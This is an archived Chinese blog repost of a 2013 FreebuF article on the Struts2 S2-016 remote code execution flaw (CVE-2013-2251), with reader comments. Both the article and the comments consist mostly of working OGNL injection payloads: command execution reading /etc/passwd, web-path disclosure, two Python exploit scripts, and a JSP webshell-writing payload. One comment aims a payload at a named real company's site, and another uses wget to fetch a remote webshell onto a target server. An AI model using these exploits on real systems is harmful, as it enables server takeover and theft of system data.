
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 93 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-strutsJava--更新Struts2再爆远程代码执行漏洞（S2-016）-FreebuFCOM/">[更新]Struts2再爆远程代码执行漏洞（S2</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全-strutsJava--更新Struts2再爆远程代码执行漏洞（S2-016）-FreebuFCOM/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-struts2-s2-016-freebuf-com">[更新]Struts2再爆远程代码执行漏洞（S2-016）- FreebuF.COM</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<ul>
<li><a href="http://www.freebuf.com/" target="_blank">首页</a></li>
<li><a href="http://www.freebuf.com/category/news" target="_blank">资讯</a></li>
<li><a href="http://www.freebuf.com/category/tools" target="_blank">工具</a></li>
<li><p><a href="http://www.freebuf.com/category/articles" target="_blank">文章</a></p>
</li>
<li><p><a href="http://www.freebuf.com/category/articles/web" target="_blank">WEB安全</a></p>
</li>
<li><a href="http://www.freebuf.com/category/articles/wireless" target="_blank">无线安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/system" target="_blank">系统安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/database" target="_blank">数据库安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/terminal" target="_blank">终端安全</a></li>
<li><a href="http://www.freebuf.com/category/articles/others-articles" target="_blank">其他</a></li>
<li><a href="http://www.freebuf.com/category/video" target="_blank">视频</a></li>
<li><a href="http://www.freebuf.com/category/jobs" target="_blank">招聘</a></li>
<li><a href="http://www.freebuf.com/category/geek" target="_blank">极客</a></li>
<li><a href="http://www.freebuf.com/bufer" target="_blank">达人</a></li>
<li><a href="http://club.freebuf.com/" target="_blank">社区</a></li>
<li><a href="http://www.freebuf.com/newsend" target="_blank">投稿</a></li>
</ul>
<p><a href="http://www.freebuf.com/wp-login.php?redirect_to=http://www.freebuf.com" title="登陆" target="_blank">登陆</a><a href="http://www.freebuf.com/wp-login.php?action=register" target="_blank">注册</a></p>
<p><a href="http://www.freebuf.com/" target="_blank"><img src="" alt="freebuf"></a></p>
<p><a href="http://www.weibo.com/freebuf" title="收听新浪微博" target="_blank">新浪微博</a> <a href="http://t.qq.com/freebuf" title="收听腾讯微博" target="_blank">腾讯微博</a><a href="http://www.freebuf.com/feed" title="订阅我们" target="_blank">订阅我们</a></p>
<h3 id="-struts2-s2-016-">[更新]Struts2再爆远程代码执行漏洞（S2-016）</h3>
<p><a href="">phper</a> @ <a href="http://www.freebuf.com/category/vuls" title="查看 漏洞 中的全部文章" target="_blank">漏洞</a> 2013-07-17 共 <strong>28624</strong> 人围观 </p>
<p><strong>Struts又爆远程代码执行漏洞了！**</strong>在这次的漏洞中，攻击者可以通过操纵参数远程执行恶意代码。<strong>**Struts 2.3.15.1之前的版本，参数action的值redirect以及redirectAction没有正确过滤，导致ognl代码执行。 </strong></p>
<p><strong>描述</strong>
影响版本 Struts 2.0.0 - Struts 2.3.15 报告者 Takeshi Terada of Mitsui Bussan Secure Directions, Inc. CVE编号 CVE-2013-2251</p>
<p><strong>漏洞证明</strong></p>
<p>参数会以OGNL表达式执行
<a href="http://host/struts2-blank/example/X.action?action:%25{3/*4}" target="_blank">http://host/struts2-blank/example/X.action?action:%25{3/*4}</a> <a href="http://host/struts2-showcase/employee/save.action?redirect:%25{3/*4}" target="_blank">http://host/struts2-showcase/employee/save.action?redirect:%25{3/*4}</a></p>
<p>代码执行</p>
<p><a href="http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a> <a href="http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a> <a href="http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}" target="_blank">http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#39;command&#39;,&#39;goes&#39;,&#39;here&#39;})).start()}</a></p>
<p><strong>漏洞原理</strong></p>
<p>The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with “action:” or “redirect:”, followed by a desired navigational target expression. This mechanism was intended to help with attaching navigational information to buttons within forms.</p>
<p>In Struts 2 before 2.3.15.1 the information following “action:”, “redirect:” or “redirectAction:” is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.</p>
<p><a href="http://struts.apache.org/release/2.3.x/docs/s2-016.html" target="_blank">Apache官方地址</a></p>
<p><strong>国内网站受灾严重</strong></p>
<p><strong><img src="http://static.freebuf.com/uploads/image/20130719/20130719234053_37320.jpg" alt="">
</strong></p>
<p><strong>以下仅供教学研究之用，严禁非法用途！</strong></p>
<p>执行任意命令EXP，感谢X提供：
?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}</p>
<p>爆网站路径EXP，感谢h4ck0r提供：</p>
<p>?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</p>
<p>python执行任意命令，感谢h4ck0r提供</p>
<p>import urllib2,sys,re def get(url, data): string = url + &quot;?&quot; + data req = urllib2.Request(&quot;%s&quot;%string) response = urllib2.urlopen(req).read().strip() print strip(response) def strip(str): tmp = str.strip() blank<em>line=re.compile(&#39;\x00&#39;) tmp=blank<em>line.sub(&#39;&#39;,tmp) return tmp if <strong>name</strong> == &#39;__main</em></em>&#39;: url = sys.argv[1] cmd = sys.argv[2] cmd1 = sys.argv[3] attack=&quot;redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{&#39;%s&#39;,&#39;%s&#39;})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}&quot;%(cmd,cmd1) get(url,attack)</p>
<p>GETSHELL EXP，感谢coffee提供：</p>
<p>?redirect:${ %23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;), %23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll(&quot;\\&quot;, &quot;/&quot;), new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close() }&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%</p>
<p>然后用以下代码写shell:</p>
&lt;form action=&quot;<a href="http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot" target="_blank">http://www./*/*/*.jp/acdap/test.jsp?f=1.jsp&amp;quot</a>; method=&quot;post&quot;&gt; <textarea >code</textarea> <input type=submit value="提交"> </form>

<p>上前目录生成1.jsp</p>
<p>5 1 您已评价！</p>
<h3 id="-freebuf-com-http-www-freebuf-com-"><img src="" alt=""> <strong>如文中未特别声明转载请注明出自:</strong> <a href="http://www.freebuf.com/" target="_blank">FreebuF.COM</a></h3>
<p><img src="" alt=""> <a href="&quot;累计分享1次&quot;">1</a>
<img src="http://www.freebuf.com/buf/plugins/wp-favorite-posts/img/heart.png" alt="Favorite" title="Favorite"><img src="http://www.freebuf.com/buf/plugins/wp-favorite-posts/img/loading.gif" alt="Loading" title="Loading"><a href="http://www.freebuf.com/vuls/?wpfpaction=add&amp;postid=11220" title="收藏该文" target="_blank">收藏该文</a></p>
<h3 id="-">相关文章</h3>
<ul>
<li><a href="http://www.freebuf.com/vuls/11220.html" target="_blank">[更新]Struts2再爆远程代码执行漏洞（S2-016）</a></li>
</ul>
<p><strong>49</strong>条评论 <strong>28626</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/vuls/10697.html" target="_blank">Android ICS adb调试工具系统还原目录遍历漏洞（可提权）</a></li>
</ul>
<p><strong>6</strong>条评论 <strong>8306</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/vuls/10611.html" target="_blank">美国VPS管理系统SolusVM 1.13.03 SQL注入漏洞（含exp）</a></li>
</ul>
<p><strong>12</strong>条评论 <strong>24962</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/vuls/10291.html" target="_blank">[最新]Plesk主机管理软件远程get shell 0day</a></li>
</ul>
<p><strong>8</strong>条评论 <strong>11826</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/vuls/10219.html" target="_blank">Metasploit更新”nginx整数溢出漏洞”攻击插件</a></li>
</ul>
<p><strong>6</strong>条评论 <strong>17096</strong>人已围观
﻿</p>
<h2 id="49-comments-">49 Comments <a href="">发表评论</a></h2>
<ol>
<li><img src="" alt=""> 生生不息 <a href=""></a> 2013-07-17    1楼</li>
</ol>
<p>目测利用工具马上出炉</p>
<p>POC来自官方：
<a href="http://struts.apache.org/release/2.3.x/docs/s2-016.html" target="_blank"><a href="http://struts.apache.org/release/2.3.x/docs/s2-016.html">http://struts.apache.org/release/2.3.x/docs/s2-016.html</a></a>
<a href="http://struts.apache.org/release/2.3.x/docs/s2-017.htm" target="_blank"><a href="http://struts.apache.org/release/2.3.x/docs/s2-017.htm">http://struts.apache.org/release/2.3.x/docs/s2-017.htm</a></a>
。。碉堡不
<a href="">亮了</a>(6)
<a href="http://www.freebuf.com/vuls/?replytocom=12981#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""> fake <a href=""></a> 2013-07-17    2楼</li>
</ol>
<p><img src="http://static.freebuf.com/uploads/image/20130717/20130717015140_44183.png" alt="">
乌云已经开始了……黑阔们拖库吧……
<a href="">亮了</a>(15)
<a href="http://www.freebuf.com/vuls/?replytocom=12984#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""> 命运 <a href=""></a> 2013-07-17    3楼</li>
</ol>
<p>不息抢沙发好速度，话说乌云又有SB在刷分了。黑产的大好机会不把握，呵呵。
<a href="">亮了</a>(17)
<a href="http://www.freebuf.com/vuls/?replytocom=12985#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3881" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/n0bele" target="_blank">n0bele </a> (1级)  <a href=""></a> 2013-07-17    4楼</li>
</ol>
<p>这真是个好厂商，没它黑帽子和那些又做黑产又做白帽子的帽子都快戴不稳了.
<a href="">亮了</a>(7)
<a href="http://www.freebuf.com/vuls/?replytocom=12986#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3486" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/hackmissmiss" target="_blank">hackmissmiss </a> (1级)  <a href=""></a> 2013-07-17    5楼</li>
</ol>
<p>刷你妈的分 一群小朋友 为了满足自己的虚荣心 不停的找网站刷分 SB
<a href="">亮了</a>(10)
<a href="http://www.freebuf.com/vuls/?replytocom=12987#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=1596" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/蓝风" target="_blank">蓝风 </a> (1级)  <a href=""></a> 2013-07-17    6楼</li>
</ol>
<p>少侠 记得提下裤子。。。。。。
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=12988#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3647" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/mujj" target="_blank">mujj </a> (1级)  <a href=""></a> 2013-07-17    7楼</li>
</ol>
<p>刷分又开始了么
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=12989#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=2313" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/angellover08" target="_blank">angellover08 </a> (1级) 某甲方漏洞挖掘研究员 <a href=""></a> 2013-07-17    8楼</li>
</ol>
<p>想投身黑产，木有门路啊
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=12990#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""> z0mbie <a href=""></a> 2013-07-17    9楼</li>
</ol>
<p>小弟看不懂，哪位能给个执行命令的语句
<a href="">亮了</a>(7)
<a href="http://www.freebuf.com/vuls/?replytocom=12992#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3777" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/uj70ky7b" target="_blank">uj70ky7b </a> (1级)  <a href=""></a> 2013-07-17    10楼</li>
</ol>
<p>刷你妹妹的分啊，能吃吗. 一分等于几万块啊。
<a href="">亮了</a>(8)
<a href="http://www.freebuf.com/vuls/?replytocom=13002#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""> X <a href=""></a> 2013-07-17    11楼</li>
</ol>
<p>?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}</p>
<p><a href="">亮了</a>(30)
<a href="http://www.freebuf.com/vuls/?replytocom=13005#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3432" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/yplinfo" target="_blank">yplinfo </a> (1级) 一句话木马 <a href=""></a> 2013-07-17    12楼</li>
</ol>
<p>哎，SB才刷分
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13006#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""> Cr0w <a href=""></a> 2013-07-17    13楼</li>
</ol>
<p>S2-17
<a href="http://host/struts2-showcase/fileupload/upload.action?redirect:http://www.yahoo.com/" target="_blank"><a href="http://host/struts2-showcase/fileupload/upload.action?redirect:http://www.yahoo.com/">http://host/struts2-showcase/fileupload/upload.action?redirect:http://www.yahoo.com/</a></a>
<a href="http://host/struts2-showcase/modelDriven/modelDriven.action?redirectAction:http://www.google.com/%23" target="_blank"><a href="http://host/struts2-showcase/modelDriven/modelDriven.action?redirectAction:http://www.google.com/%23">http://host/struts2-showcase/modelDriven/modelDriven.action?redirectAction:http://www.google.com/%23</a></a>
<a href="">亮了</a>(3)
<a href="http://www.freebuf.com/vuls/?replytocom=13007#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""> 生生不息 <a href=""></a> 2013-07-17    14楼</li>
</ol>
<p><a href="https://kf.sf-express.com/css/loginmgmt/index.action?redirect:$" target="_blank"><a href="https://kf.sf-express.com/css/loginmgmt/index.action?redirect:$">https://kf.sf-express.com/css/loginmgmt/index.action?redirect:$</a></a>{%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}
<a href="">亮了</a>(11)
<a href="http://www.freebuf.com/vuls/?replytocom=13009#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3687" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/lock" target="_blank">lock </a> (6级) fork you! <a href=""></a> 2013-07-17    15楼</li>
</ol>
<p>import urllib2,getopt,sys</p>
<p>def info():
print &quot;python struts.py -u <a href="http://baidu.com/test.action" target="_blank"><a href="http://baidu.com/test.action">http://baidu.com/test.action</a></a> -d whoami&quot;</p>
<p>def get(url, data):
string = url + &quot;?&quot; + data
req = urllib2.Request(string)
response = urllib2.urlopen(req)
print response.read()</p>
<p>if <strong>name</strong> == &#39;<strong>main</strong>&#39; and len(sys.argv) &lt; 2:
info()
try:
opts, args = getopt.getopt(sys.argv[1:],&quot;u:d:&quot;)
except:
sys.exit(2)
for opt, value in opts:
if opt == &#39;-u&#39;:
url = value
elif opt == &#39;-d&#39;:
test = value
attack=&quot;?redirect:${/#a=(new java.lang.ProcessBuilder(&#39;%s&#39;)).start(),/#b=/#a.getInputStream(),/#c=new java.io.InputStreamReader(/#b),/#d=new java.io.BufferedReader(/#c),/#e=new char[50000],/#d.read(/#e),/#matt=/#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),/#matt.getWriter().println(/#e),/#matt.getWriter().flush(),/#matt.getWriter().close()}&quot;%test
get(url,attack)</p>
<p><a href="">亮了</a>(8)
<a href="http://www.freebuf.com/vuls/?replytocom=13013#respond" target="_blank">回复</a></p>
<ol>
<li><a href="http://www.freebuf.com/?author=3113" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/二手玫瑰" target="_blank">二手玫瑰 </a> (1级) 人生如梦亦如画 <a href=""></a> 2013-07-17    16楼</li>
</ol>
<p>麻烦各位大神提供爆网站绝对路径的办法。。。。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13016#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> h4ck0r <a href=""></a> 2013-07-17</li>
</ul>
<p>@二手玫瑰  ?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13023#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=7" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/pnig0s" target="_blank">pnig0s </a><img src="http://www.freebuf.com/buf/themes/freebuf/images/medals/f1.png" alt="" title="FB达人"> (10级) 知道创宇安全工程师 <a href=""></a> 2013-07-17    17楼</li>
</ul>
<p>评论里各路大神都发威了：）
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13017#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=1353" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/元首" target="_blank">元首 </a> (3级)  <a href=""></a> 2013-07-17    18楼</li>
</ul>
<p>路径</p>
<p><a href="http://www.xxx.com/xxxx.action?redirect%3A%24{%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28&quot;%2F&quot;%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29}" target="_blank"><a href="http://www.xxx.com/xxxx.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D">http://www.xxx.com/xxxx.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</a></a>
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/vuls/?replytocom=13018#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=2313" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/angellover08" target="_blank">angellover08 </a> (1级) 某甲方漏洞挖掘研究员 <a href=""></a> 2013-07-17    19楼</li>
</ul>
<p>freebuf大牛众多，小弟在此膜拜。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13019#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3210" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/xiao_hen" target="_blank">xiao_hen </a> (1级)  矮穷挫小分队。 <a href=""></a> 2013-07-17    20楼</li>
</ul>
<p>freebuf大牛众多，小弟在此膜拜。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13020#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=3692" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/dennych0u" target="_blank">dennych0u </a> (1级)  <a href=""></a> 2013-07-17    21楼</li>
</ul>
<p>悲催的攻城狮们要精尽人亡了~
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13021#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> z0mbie <a href=""></a> 2013-07-17    22楼</li>
</ul>
<p>请教各路神仙，怎么反弹SHELL,怎么写shell
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13025#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> helen是sb <a href=""></a> 2013-07-17    23楼</li>
</ul>
<p>getshell
wget <a href="http://www.sss.com/data/avatar/test.txt" target="_blank"><a href="http://www.sss.com/data/avatar/test.txt">http://www.sss.com/data/avatar/test.txt</a></a> -O /home/www/test.jsp
test.txt是远程webshell的 /home/www/test.jsp 是目标目录
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/vuls/?replytocom=13027#respond" target="_blank">回复</a></p>
<ul>
